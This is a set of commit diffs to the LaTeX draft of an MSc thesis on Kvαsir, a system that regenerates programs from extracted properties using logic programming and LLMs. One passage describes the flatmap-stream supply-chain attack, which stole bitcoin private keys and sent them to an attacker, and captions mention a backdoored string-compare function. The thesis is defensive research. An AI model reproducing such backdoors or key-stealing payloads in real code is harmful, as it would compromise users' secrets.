+  prior approaches, \sys treats the input program as an untrusted artifact and
+  explicitly projects it into a minimal set of verifiable properties, such as
+  input/output behavior, execution traces, and API signatures. These properties
+  serve as constraints during synthesis and are checked post hoc to ensure
+  correctness.
 \sys is evaluated on a diverse set of program transformation tasks
 including security hardening, language translation, idiomatic rewriting, de-obfuscation,
-and modular refactoring.
-Target programs are sourced from high-profile supply-chain attacks, 
-online repositories, programming competitions, and real-world software projects.
-\sys produces high-quality outputs that satisfy goals in all but two cases,
-even on instances where a state-of-the-art LLM fails to do so.
+and modular refactoring showing strong results, even on tasks where state-of-the-art LLMs fail.
 \end{abstract}
@@
 
-\begin{wrapfigure}[3]{r}{.7\columnwidth}
+\begin{wrapfigure}[4]{r}{.7\columnwidth}
 % \vspace{-10pt}
@@
 \end{wrapfigure}
-The query requests preservation of I/O behavior and translation to Haskell. The
-logic engine deduces that extracting I/O traces and the function signature is
+The query asks \sys to preserve I/O behavior and translate the input program to Haskell.
+The logic engine deduces that extracting I/O traces and the function signature is
 sufficient; the knowledge base automatically associates the target language
@@
 #minimize{C : cost(E,C)}.
-\end{minted}
-\caption{An optimization directive.}
+#maximize{C : cost(E,C)}.
+\end{minted}
+\caption{Examples of optimization directives.
+Note that this differs from \sys's \texttt{\#min} or \texttt{\#max} directives, which is used to direct the synthesizer to minimize a property of the program but has no effect on the produced answer set.}
 \label{lst:optimization}
@@
 This section provides a selection of samples from the evaluation of \sys.
-These instances provide some interesting insights into the capabilities of \sys, the challenges it faces.
-Some examples also feature constrasts between \sys and a naive LLM-based approach.
+These instances provide some interesting insights into the capabilities of \sys and its shortcomings.
+The samples also provide concrete comparison between \sys and a naive LLM-based approach.
 
@@
 reaches a specified length.
-\begin{wrapfigure}[4]{r}{0.4\columnwidth}
+
+\begin{wrapfigure}[5]{r}{0.4\columnwidth}
 \begin{minted}{prolog}
@@
 program to remove that potential security vulnerabilities or malicious behavior.
-\begin{wrapfigure}[3]{r}{0.7\columnwidth}
+
+\begin{wrapfigure}[4]{r}{0.7\columnwidth}
 \begin{minted}{prolog}
@@
 The query for \sys is shown on the right.
-\Cref{lst:string_compare_original} shows the original string compare function, which writes to a file if the
+\Cref{lst:string-compare-original} shows the original string compare function, which writes to a file if the
 second argument is a fixed secret value.
@@
 \end{minted}
+  \label{lst:string-compare-original}
   \caption{The original string compare function, which writes to a file if the
@@
   of a larger attack vector.}
-  \label{lst:string_compare_original}
 \end{listing}

### 2025-07-17 docs/paper/draft.tex
Fix references
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Fixes to formatting
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \usepackage{balance}
-\usepackage{minted}
+\usepackage[newfloat]{minted}
 \usepackage{xcolor}
@@
 \newcommand{\todo}[1]{\hl{\textbf{TODO:} #1}\xspace}
-\newcommand{\sys}{{\scshape Kv{\textalpha}sir}\xspace}
+\newcommand{\sys}{{\scshape Kv{$\alpha$}sir}\xspace}
 \newcommand{\rf}[1]{\ref{#1}}
@@
 
-\title[Controllable Program Regeneration]{\sys: Controllable Program Regeneration\\{\vspace{1em}\normalsize DTU MSc Thesis \\ Advisors: Christian Gram Kahlauge and Nikos Vasilakis}}
-\author[Evangelos Lamprou]{Evangelos Lamprou}
+\title[Property-Guided Program Regeneration]{\sys: Property-Guided Program Regeneration\\{\vspace{1em}\large Technical University of Denmark, MSc Thesis {\\\vspace{-1em}} Advisors: Christian Gram Kahlauge and Nikos Vasilakis}}
+\author{Evangelos Lamprou}
 
@@
 \heading{Formal foundations and alternative implementations}
-The transformation semantics introduced by \sys are grounded in logic
+The transformation language semantics introduced by \sys are grounded in logic
 programming and inherit properties like compositionality.
@@
 \end{minted}
-  \label{lst:string-compare-original}
   \caption{The original string compare function, which writes to a file if the
@@
   of a larger attack vector.}
+  \label{lst:string-compare-original}
 \end{listing}
@@
 
+\cleardoublepage
 \end{document}

### 2025-07-17 docs/paper/draft.tex
No mention of paper
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-% \acmSubmissionID{PAPER ID}
 \renewcommand\footnotetextcopyrightpermission[1]{}
@@
   semantic guarantees, and their usage often boil down to brittle prompting strategies.
-This paper presents \sys, a system for controllable program regeneration that
+This work presents \sys, a system for controllable program regeneration that
   combines declarative property constraints with LLM-guided synthesis. Unlike
@@
 
-This paper present \sys, a system for \emph{property-guided program regeneration}.
+I present \sys, a system for \emph{property-guided program regeneration}.
 \sys allows users
@@
 \heading{Contributions}
-The paper's contributions are:
+This work's contributions are:
 \begin{itemize}
@@
 
-% \begin{table*}
-%   \centering
-%   \caption{
-%     \textbf{Comparison of transformation paradigms.}
-%     \sys combines symbolic planning, property reasoning, and guided regeneration.
-%   }
-%   \label{tbl:comparison}
-%     \begin{tabular}{lcccccccc}
-% \toprule
-% \textbf{Approach} & 
-% \rotatebox{90}{\textbf{Uses Input}} &
-% \rotatebox{90}{\textbf{Decl. Goals}} &
-% \rotatebox{90}{\textbf{Neg. Const.}} &
-% \rotatebox{90}{\textbf{Opt. Support}} &
-% \rotatebox{90}{\textbf{Modular}} &
-% \rotatebox{90}{\textbf{Explainable}} &
-% \rotatebox{90}{\textbf{Scoped}} & 
-% Source \\
-% \midrule
-% Classical Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{alur2013sygus, solar2008sketch} \\
-% Refactoring Tools & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squadfillhr$ & $\squadfillhr$ & \cite{} \\
-% PBE Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
-% CEG Synthesis & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{solar2008sketch} \\
-% Pure LLMs & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
-% \textbf{\sys} & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & (this paper) \\
-% \bottomrule
-% \end{tabular}
-% \end{table*}
-
 \heading{Program synthesis}
@@
 \section{Conclusion}
-This paper introduced \sys, a system for property-guided program regeneration
+I introduced \sys, a system for property-guided program regeneration
 that bridges the flexibility of large language models with the precision of

### 2025-07-17 docs/paper/draft.tex
More fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[7]{r}{.8\columnwidth}
+\begin{wrapfigure}[6]{r}{.8\columnwidth}
   \begin{minted}{prolog}
@@
 Instead of discarding the regeneration attempt wholesale, the system uses the failure to revise or re-execute the synthesis phase.
-Some forms are:
+The forms are:
 \begin{itemize}
@@
   \item \emph{Feedback loop}: \sys will provide the previous regeneration attempt 
-    as an additional context to the LLM, together with an explanation of the properties that the regeneration violates, prompting it to adapt its output based on prior failures.
-    This mode is only activated if the verifier knows that the output will not to taint
-    followup regeneration attempts.
-  \item \emph{Fallback handling}: If a function repeatedly fails validation, \sys may leave the original version intact or mark it for manual inspection.
+    as an additional context to the LLM, together with an explanation of the properties that the regeneration violates.
+    A key assumption is that the output will not to taint followup regeneration attempts,
+    which should hold based on the synthesis plan, which takes query and plugin constraints into account.
+  \item \emph{Fallback handling}: If a function fails validation three times, \sys leaves the original version intact or mark it for manual inspection.
 \end{itemize}
@@
 For the SSCA benchmarks, \sys successfully regenerates all three malicious libraries, removing the malicious behavior while preserving the original functionality.
-For the flatmap-stream attack, \sys uses some domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
+For the flatmap-stream attack, \sys uses domain-specific logic (encoded in its knowledge-base by the \ttt{js-stream} plugin) to generate a function that produces a node \ttt{Stream} object.
 For the IOCCC benchmarks, \sys regenerates the \ttt{adder} program, which is a simple program that adds two numbers,
@@
 
-Here, I outline some possible future directions for \sys and its successors:
+Here, I outline possible future directions for \sys and its successors:
 
@@
 This section provides a selection of samples from the evaluation of \sys.
-These instances provide some interesting insights into the capabilities of \sys and its shortcomings.
+These instances provide interesting insights into the capabilities of \sys and its shortcomings.
 The samples also provide concrete comparison between \sys and a naive LLM-based approach.

### 2025-07-17 docs/paper/draft.tex
Let figures move
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Fix placement
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \begin{itemize}
-  \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
+  \item A program transformation framework the combines logic-based reasoning with LLM-assisted program synthesis~(\cref{sec:design});
  \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
@@
 
+\begin{wrapfigure}[6]{r}{.7\columnwidth}
+  \begin{minted}{prolog}
+db('music.db').func(f1).func(f2).
+trc_sql(p_,I,T) :-
+   trc_sql(p,I,T), graph(p,I,_).
+graph(call(f2,call(f1),I),I,O):-
+                   graph(p,I,O).
+\end{minted}
+\end{wrapfigure}
 Having the database initialization being in the same function as 
@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[6]{r}{.8\columnwidth}
-  \begin{minted}{prolog}
-db('music.db'). func(f1). func(f2).
-trace_sql(p_, I, T) :- trace_sql(p, I, T),
-                       graph(p, I, _).
-graph(call(f2, call(f1), I), I, O) :-
-                       graph(p, I, O).
-\end{minted}
-\end{wrapfigure}
-\sys, given the query to the right, will 
+\sys, given the query to the above, will 
 generate program that consists of two functions,
@@
 
-\begin{listing}[p]
+\begin{listing}[htpb]
 \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
@@
 
-\begin{listing}[p]
+\begin{listing}[htpb]
 \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
@@
 
-\begin{listing}[H]
+\begin{listing}[htpb]
 \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
@@
 \end{minted}
-  \caption{The output of naively regenerating the string compare function using \gptmodel. The code includes the malicious behavior.}
+  \caption{The output of naively regenerating the string compare function using \gptmodel.
+  The code includes the malicious behavior of writing to a file if the second argument is a fixed secret value.}
   \label{lst:string_compare_fool}
@@
 
-\begin{listing}[H]
+\begin{listing}[htpb]
   \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}

### 2025-07-18 docs/paper/draft.tex
Tweaks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
   but their outputs are shaped by surface cues, lack
-  semantic guarantees, and their usage often boil down to brittle prompting strategies.
+  semantic guarantees, and their usage often boil down to fragile prompting strategies.
 This work presents \sys, a system for controllable program regeneration that
@@
   input/output behavior, execution traces, and API signatures. These properties
-  serve as constraints during synthesis and are checked post hoc to ensure
-  correctness.
+  serve as constraints during synthesis, are checked post hoc to ensure
+  correctness, and can be mutated to allow for flexible program transformation through regeneration.
 \sys is evaluated on a diverse set of program transformation tasks
@@
 
-I present \sys, a system for \emph{property-guided program regeneration}.
+This work presents \sys, a system for \emph{property-guided program regeneration}.
 \sys allows users
@@
 \heading{Answer Set Programming}
-Answer Set Programming (ASP) \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
+ASP \cite{Gelfond_2000, Eiter_2009} is a problem-solving paradigm with roots in logic programming and non-monotonic reasoning.
 The programming 
@@
 
-To validate that a regenerated program satisfies the intended goals, \sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan.
-Verification accepts only programs that meet the plan's constraints and provides feedback for refining or retrying those that do not.
+\sys includes an explicit verification phase that checks whether the output adheres to the enforced properties in the synthesis plan. 
+Verification accepts only programs that meet the plan's constraints and
+provides feedback for refining or retrying those that do not.
 
@@
   \item For $\texttt{signature}(f)$, the checker matches the regenerated function's name, parameters, and arity against the extracted signature.
-  \item For $\texttt{pure}(f)$, the checker examines control flow and side-effecting operations to detect possible violations.
 \end{itemize}
 
-Checkers are modular and contributed by plugins. Their combined results determine whether a candidate is considered valid under the current plan.
+Checkers are modular and contributed by plugins.
+Their combined results determine whether a candidate is considered valid under the current plan.
 For minimization and maximization goals, the verification phase uses the less-than or greater-than operators as are defined internally by the plugin verifying the given property.
@@
 If the value remains unchanged for two consecutive attempts, its considered satisfied.
+Its important that certain properties that are not easily verifiable, such as \ttt{pure}, 
+do not correspond to a specific verifier, but rather influence what kind of propoerties can be extracted 
+otherwise to make sure they are not violated during regeneration.
+For this example, a system call trace of the program will not be provided to the LLM instance, 
+as that could encode side-effects present in the original program.
 
@@
 
-The \sys evaluation is along three axes:
+\sys's evaluation aims to answer two key questions:
 
@@
   \item[\textbf{Q2}] \textbf{LLM Baseline}: How does \sys compare to naively prompting a large language model?
-  \item[\textbf{Q3}] \textbf{Planning Efficiency \& Precision}: Does minimizing extracted properties help regeneration succeed faster and more reliably?
 \end{itemize}
 
-\section{Benchmarks \& Methodology}
+\subsection{Benchmarks \& Methodology}
 
@@
 if it is correct, satisfies the query, and passes all tests all three times.
+The specific benchmark programs were selected based on a combination of their ubiquity in programming practise, their
+popularity in programming culture, and their tractability given the implemented \sys plugins.
 The Rosetta Code~\cite{rosettacode} benchmarks include four programming tasks written in four different
@@
 However, this version does not match exactly the semantics of the original one, as it operates over infinitely nested lists, rather than only one level deep ones.
+Thus, a $.5$ score in correctness is given.
 The \ttt{Q\_rsqrt} program includes the obvious, idiomatic computation of the inverse square root ($1/\sqrt{x}$) rather than the original bit-level manipulation.
@@
 overcoming the inherent weaknesses of a purely prompt-based approach.
-
-\subsection{Q3: Planning Efficiency \& Precision}
-
-To evaluate the impact of \sys's property planning, we compare it against a \gptmodel baseline that performs prompt-only rewriting without explicit access to guiding properties.
-
-We consider two criteria for each regenerated program:
-
-\begin{itemize}
-  \item \textbf{Wanted Property Satisfaction:} Does the output program satisfy all positive properties declared in the query (\eg \texttt{pure}, \texttt{language(haskell)})?
-  \item \textbf{Unwanted Property Avoidance:} Does the output avoid introducing disallowed behaviors (\eg side effects, global state, unsupported language features)?
-\end{itemize}
-
-\sys consistently satisfies more of the declared properties while avoiding
-unintended behaviors.
-Following is a qualitative analysis of the results.
-In the \texttt{flatmap-stream} benchmark,
-\gptmodel often inclduded malicious side effects when the code appeared innocuous,
-whereas \sys generated pure rewrites by treating the source as
-untrusted and grounding regeneration in I/O behavior alone.
-Across all benchmarks, the planning step completes in under 50ms on average.
-Similarly, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
-manipulations that are not idiomatic in Haskell, while \sys generates a simple
-and idiomatic Haskell function that computes the inverse square root.
-This is guided by the fact the \sys extracts and provides to its backend model only the function signature 
-and length of the program, which it minimizes, without including the original source code,
-which as shown in the experimental results makes the model over-fit its regeneration to it.
-\sys's I/O pair extraction also provides confidence that 
-the regenerated program has the same client-visible behavior as the original one, while 
-prompting a model like \gptmodel would always require manual inspection or the presence 
-of developer tests to verify the correctness of the regeneration.
+In-depth examples of interesting evaluation results are discussed in \cref{sec:eval-samples}.
 
@@
 tools, offering a declarative model for expressing properties and constraints.
-Answer Set Programming (ASP), in particular, provides a rich framework for
+ASP, in particular, provides a rich framework for
 expressing defaults, exceptions, and optimization via stable model semantics
@@
 \section{Conclusion}
-I introduced \sys, a system for property-guided program regeneration
+This work introduced \sys, a system for property-guided program regeneration
 that bridges the flexibility of large language models with the precision of
@@
 While this work has applied \sys exclusively to open-source software, its
-capabilities raise ethical and legal questions. Regenerating
+capabilities raise ethical and legal questions.
+Regenerating
 proprietary software, de-obfuscating binaries, or reimplementing licensed
 systems into equivalent ones with more permissive licensing 
-could challenge existing norms and
-regulations. 
+could challenge existing norms and regulations. 
 It is important to consider
 safeguards and responsible disclosure practices towards ethical program regeneration.
+Solutions to similar problems have been
 
@@
 \section{Evaluation Samples}
+\label{sec:eval-samples}
 This section provides a selection of samples from the evaluation of \sys.

### 2025-07-18 docs/paper/draft.tex
Fixes around
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 Recent advances in large language models (LLMs) have opened new possibilities for automating program transformation and synthesis tasks, making them attractive tools for software evolution, albeit with caveats.
-This flexibility has positioned them as attractive tools for software evolution
-compared to traditional program synthesis techniques, which often struggle
-to scale to real-world settings or across languages and require significant developer involvement~\cite{reynolds2019syguscomp,leino2016dafny,wu2023programming,dynamoth2016,cambronero2019active}.
+This flexibility makes LLMs more attractive for software evolution than traditional synthesis techniques, which struggle to scale or generalize
+across languages and domains~\cite{reynolds2019syguscomp,leino2016dafny,wu2023programming,dynamoth2016,cambronero2019active}.
 LLMs can translate code across languages~\cite{ou2025enhancingllmbasedcodetranslation},
@@
 Having the database initialization being in the same function as 
-the database access has architectural and performance implications.
+the database access has negative architectural and performance implications.
 In addition, there exist systems that can benefit from further decomposition
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\sys, given the query to the above, will 
-generate program that consists of two functions,
-whose composition is equivalent to the original program, and feature 
-the same I/O and trace properties (a trace here being the sequence of SQL 
-queries transmitted to the database) driven by an input.
-\sys wraps the node process with monitors that extract the SQL queries 
-sent to the database for 24 generated inputs.
-Then, after 20.4 seconds and two attempts, it arrives at two functions $f_1$, and 
+The query above first specifies \ttt{music.db} as the database to use.
+This information is relevant to the \ttt{trc\_sql} plugin, which records the SQL queries 
+sent to the databse when the function is driven by an input $i$.
+The set of inputs $I$ the function will be driven by is generated by the \ttt{graph} plugin.
+The \ttt{call} predicate indicates a function call.
+Spefically, the query asks \sys to generate two functions such 
+that the graph of the composition of the two is equivalent to the graph (and SQL trace) of the original program.
+This transforms each I/O pair to (for example) $\langle\texttt{(f2(f1(), 'Metalica'))}, \texttt{[...]}\rangle$.
+\sys first generates 24 inputs, then wraps the node process with monitors that extract the SQL queries.
+Then, it executes the original program on each input, recording the output and SQL traces.
+Following, \sys transforms the I/O pairs and the SQL traces into a prompt template,
+and prompts an LLM instance to generate two functions $f_1$ and $f_2$, which when composed would have the given behavior.
+Their composition is then again driven by the same inputs and the SQL traces and outputs are recorded.
+After 20.4 seconds and two attempts, \sys arrives at two functions $f_1$, and 
 $f_2$, where their composition $f_2(f_1(), i)$,
-is equivalent to the original \ttt{getAlbumsByArtist} function across each input $i$.
-A final processing step renames functions $f_1$ and $f_2$ by prompting an LLM instance.
-Alternatively, the user could have provided specific signatures and names for each 
-functions as an additional guiding property.
+is equivalent to the original \ttt{getAlbumsByArtist} function across each input $i$ in regards to its graph and SQL trace .
+The user could have provided specific signatures and names for each 
+function as an additional guiding property.
 The resulting program is:
 \begin{minted}[frame=lines]{js}
-function connectDB() {
+function f1() {
  const sqlite = require('sqlite');
@@
 
-function getAlbumsByArtist(db, artist) {
+function f2(db, artist) {
  const rows = await db.all("SELECT album
@@
 A total
-of six plugins (\ttt{input}, \ttt{graph}, \ttt{signature}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{javascript2haskell})
+of six plugins (\ttt{input}, \ttt{graph}, \ttt{signature}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{llm_translate})
 were required to perform the above transformations, each
@@
 can(signature(p)).
-% ---  Plugin: javascript2haskell ---
-can(js2hs(p)). 
-do(language(p, haskell)) :- do(js2hs(p)).
-:- do(js2hs(p)), not language(p, javascript).
-
+% ---  Plugin: llm_translate ---
+can(llm_translate(p, haskell)).
+  do(language(p, haskell)) :- do(llm_translate(p, haskell)).
 % ---- Axioms ----
@@
   The program contains facts coming from (1) the input program (written in C),
-  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{javascript2haskell}),
+  (2) three plugins (\ttt{len}, \ttt{signature}, and \ttt{llm\_translate}),
   (3) axioms from the logic engine (\eg a program can have one language, an analysis will be applied only if possible, all goals must be satisfied), and
@@
 }
-A \ttt{javascript2haskell} plugin may prepend:
+A \ttt{llm_translate} plugin given that the output program must be written in Haskell, may prepend:
 
@@
     Rosetta Code & 16/16  \\
-    Short Utilities & 13/10 \\
+    Short Utilities & 10/13 \\
     SSCA & 3/3  \\

### 2025-07-18 docs/paper/draft.tex
End-to-end pass
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
   prior approaches, \sys treats the input program as an untrusted artifact and
-  explicitly projects it into a minimal set of verifiable properties, such as
+  explicitly projects it into a set of verifiable properties, such as
   input/output behavior, execution traces, and API signatures. These properties
@@
   \caption{\textbf{\sys overview}
-Given a transformation query, and a source program, \sys extracts a minimal set
+Given a transformation query, and a source program, \sys extracts a set
   of properties,
@@
 As shown in \cref{fig:overview}, given a source program and
-a query, \sys extracts a minimal set of relevant properties, guided by a
-logic engine and a domain-specific knowledge base, and synthesizes a new
-program that satisfies the desired constraints.
+a query, \sys extracts a set of relevant properties, guided by its
+logic engine, and synthesizes a new
+program that satisfies the given constraints.
 
@@
 
-\sys enables users to specify transformation goals declaratively.
-Logical constraints over properties of the
-regenerated program express these goals. Examples are input-output equivalence, side-effect elimination,
-target language, lines of code, and others.
-
-Given a program and a query over desired properties, \sys selects a minimal set
+Given a program and a query over desired properties,
+\sys selects a set
 of properties to extract from the original program, then attempts to synthesize
@@
 \sys casts this process as an optimization problem, where the goal is to find a
-program that satisfies the query while preserving as much of the original
-program’s properties as possible.
+program that satisfies the query.
 If the query is unsatisfiable under
@@
 This section shows the application of \sys
-to three distinct program transformation tasks, 
-targeting security, language translation, compatibility,
-idiomaticity, and modularity.
+to four distinct program transformation tasks, 
+targeting security,
+language translation,
+idiomaticity,
+and modularity.
 
 \heading{A compromised javascript library}
-The \texttt{flatmap-stream} library was implicated in a high-profile
+The \ttt{flatmap-stream} library was implicated in a high-profile
 supply-chain attack that exfiltrated Bitcoin credentials~\cite{ev:eurosec:2022}.
-While it preserved
-client-observable behavior, the library accessed the filesystem, network, and
+While the library preserved
+its client-observable behavior, an malicious payload inserted in the module's code by an adversarial developer accessed the filesystem, network, and
 global state under specific conditions.
-Program regeneration can automatically remove possible malicious payloads
-while preserving the original program's observable behavior,
-especially in this scenario, where the attack is highly obfuscated and 
-activates under precise conditions~\cite{harp:ccs:2021}.
+Speficially, 
+the library would
+(1) detect whether it is running under the dependency tree of a popular bitcoin wallet
+application~\cite{copay} and on the live bitcoin network,
+(2) collect the user's private keys, 
+(3) send those to an attacker-controlled machine,
+and finally (4) perform its benign functionality.
+Program regeneration can automatically remove such malicious payloads
+using the insight that the insight that they retain the original library's functionality,
+while performing a side-effectful attack on-the-side~\cite{harp:ccs:2021}.
+This approach can secure the component even when the attack is highly obfuscated and 
+activates under precise conditions.
+The slightly simplified source code of the compromised library is as follows:
 \begin{minted}[frame=lines]{js}
@@
 
-\begin{wrapfigure}[3]{r}{.7\columnwidth}
+\begin{wrapfigure}[4]{r}{.7\columnwidth}
 \vspace{-10pt}
@@
 graph(p_, I, O) :- graph(p, I, O).
+fsignt(p_, S) :- fsignt(p, S).
 pure(p_).
@@
 \end{wrapfigure}
-To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \ttt{P\_} to exhibit the same I/O behavior,
+To the right is a program written in the \sys query language to express 
+this regeneration goal.
+This query requires the regenerated program \ttt{p\_} to exhibit the same I/O behavior as the original program \ttt{p}
 but forbids side-effects.
-\sys first arrives at a minimal set of properties to extract from the
+\sys takes this query and arrives at the set of properties to extract from the
 original program, given its knowledge base and the query.
-This set is $\{\ttt{input(P, I)}, \ttt{graph(P, I, O)}, \ttt{signature(P, S)}, \ttt{pure(P)}\}$, where
-\texttt{input(P, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
+This set is $\{\ttt{graph(p, I, O)}, \ttt{inpt(P, I)}, \ttt{fsignt(P, S)}, \ttt{pure(P)}\}$, where
+\ttt{input(p, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
 by providing the program's source code to an LLM instance and asking it to generate a set of inputs;
-\texttt{graph(P, I, O)} extracts the client-observable I/O behavior of the program
-by executing the original program on the generated inputs and recording the outputs;
-and \texttt{signature(P, S)} extracts each function's signature using a language-aware parser.
-The, \texttt{pure(P)} property means that \sys will not provide to the LLM 
+\ttt{graph(p, I, O)} extracts the client-observable I/O behavior of the program
+by executing the original program on the generated inputs and recording the outputs
+(an example I/O pair is $\langle\ttt{([1,[2,3]], (x)=>x+1)}\to\ttt{[2,3,4]}\rangle$);
+and \ttt{fsignt(p, S)} extracts the function's signature using a language-aware parser.
+The, \ttt{pure(p)} property means that \sys will not provide to the LLM 
 instance any information that could encode side-effects, such as the
 program's source code, a system call trace, or a filesystem access trace.
-
-After 30.4 seconds and one attempt, \sys generates the following program:
+After 30.4 seconds and one attempt, having generated 30 I/O pairs, \sys generates the following program:
 \begin{minted}[frame=lines]{js}
@@
 Here, the goal is to regenerate a semantically equivalent version
-of \texttt{flatmap-stream} in Haskell, to enable integration with a
+of \ttt{flatmap-stream} in Haskell, to enable integration with a
 Haskell-based pipeline or facilitate formal reasoning.
 
-\begin{wrapfigure}[4]{r}{.7\columnwidth}
+\begin{wrapfigure}[7]{r}{.5\columnwidth}
 % \vspace{-10pt}
 \begin{minted}{prolog}
-graph(p_, I, O) :- graph(p, I, O).
+graph(p_, Ih, Oh) 
+  :- graph(p, Ijs, Ojs),
+     tr(Ijs, Ih),
+     tr(Ojs, Oh).
 language(p_, haskell).
@@
 The logic engine deduces that extracting I/O traces and the function signature is
-sufficient; the knowledge base automatically associates the target language
-\texttt{Haskell} with purity.
-\sys transforms each extracted I/O example into an equivalent one in Haskell (\eg 
-the pair $\langle\texttt{([1,[2,3]], (x)=>x+1)}\to\texttt{[2,3,4]}\rangle$ 
-becomes $\langle(\texttt{[1, [2,3]], Js("(x)=>x+1"))}\to\texttt{[2,3,4]}\rangle$).
+sufficient.
+The \ttt{tr} predicate is a generic LLM-assisted translator, which 
+means that an LLM instance will be used to convert the inputs and outputs from Javascript 
+to Haskell.
+In this case, the given query is sufficient for the translation to succeed, 
+but a natural-language description of the transformation can be passed as an additional 
+argument to \ttt{tr}.
+\sys, same as before, extracts an I/O trace from the original program.
+Then, it transforms each extracted I/O example into an equivalent one in Haskell (\eg 
+the pair $\langle\ttt{([1,[2,3]], (x)=>x+1)}\to\ttt{[2,3,4]}\rangle$ 
+becomes $\langle(\ttt{[1, [2,3]], Js("(x)=>x+1"))}\to\ttt{[2,3,4]}\rangle$).
 Finally, it provides the transformed examples to a new LLM instance, prompting it
 to generate a Haskell program that satisfies the same I/O behavior.
-After 32.2 seconds, having generated 20 I/O pairs, \sys produces the following
-Haskell program (truncated for brevity):
+After 32.2 seconds, having generated and subsequently translated 20 I/O pairs,
+\sys produces the following Haskell program (truncated for brevity):
 \begin{minted}[frame=lines]{haskell}
@@
 \sys extracts the set of properties \ttt{signature(F)} and \ttt{graph(F)} from
-the original program, where \texttt{signature(F)} is the
-signature of the function (including its name, return type, and arguments), and \texttt{graph(F)} is the I/O behavior of the function
+the original program, where \ttt{signature(F)} is the
+signature of the function (including its name, return type, and arguments), and \ttt{graph(F)} is the I/O behavior of the function
 on a set of generated inputs.
@@
 
-\begin{wrapfigure}[6]{r}{.7\columnwidth}
+\begin{wrapfigure}[7]{r}{.7\columnwidth}
   \begin{minted}{prolog}
@@
 that the graph of the composition of the two is equivalent to the graph (and SQL trace) of the original program.
-This transforms each I/O pair to (for example) $\langle\texttt{(f2(f1(), 'Metalica'))}, \texttt{[...]}\rangle$.
+This transforms each I/O pair to (for example) $\langle\ttt{(f2(f1(), 'Metalica'))}, \ttt{[...]}\rangle$.
 \sys first generates 24 inputs, then wraps the node process with monitors that extract the SQL queries.
@@
 \heading{Key results}
-\sys is able to effectively transform all programs across the above tasks,
+\sys is able to be effectively applied to all the above transformation goals,
 producing high-quality outputs that satisfy user-specified constraints.
 A total
-of six plugins (\ttt{input}, \ttt{graph}, \ttt{signature}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{llm_translate})
+of six plugins (\ttt{input}, \ttt{graph}, \ttt{fsignt}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{tr})
 were required to perform the above transformations, each
@@
 property extraction, (3) program synthesis, and (4) verification and feedback.
-These phases interact through a shared representation of the program and its
-transformation goals.
+These phases interact through a shared representation of the program.
 
@@
 to the logic engine.
-Essentially, these describe what needs to hold for an analysis to be applicable to the given 
+These describe what needs to hold for an analysis to be applicable to the given 
 program and what properties \sys will preserve or transform after regeneration.
 Then, the planning component accepts one or more user-provided regeneration goals (termed as the query).
-The full set of rules and predicates are used to construct an ASP program
+The full set of rules and predicates are used to construct a logic program
 which is then given to an off-the-shelf solver~\cite{gebser2007clasp}.
-% TODO: Explain what the solvr does (optimization)
 From the solver's output, the planner constructs a plan that specifies which
@@
 preserved during regeneration in order to fulfill the query.
+If the query is unsatisfiable, \sys halts and produces an error message.
 
@@
 filesystem access), or its structure (\eg, use of a particular API or programming idiom).
-While some properties are derived from generic analyses
-applicable across languages~(\eg examples of input-output behavior), others are specific to the input program's language and runtime model.
+Some properties are derived from generic analyses
+applicable across languages~(\eg input-output behavior) 
+and others are specific to the input program's language and runtime model.
+Plugins insert preconditions for the analyses they provide into the \sys knowledge base.
 
 \heading{Synthesis}
-Guided by the transformation plan, \sys creates a prompt template which is then
-augmented with the extracted properties, having them normalized to a human-readable text representation.
+Guided by the transformation plan, \sys creates a prompt template which it then
+augments with the extracted properties, having them normalized to a human-readable text representation.
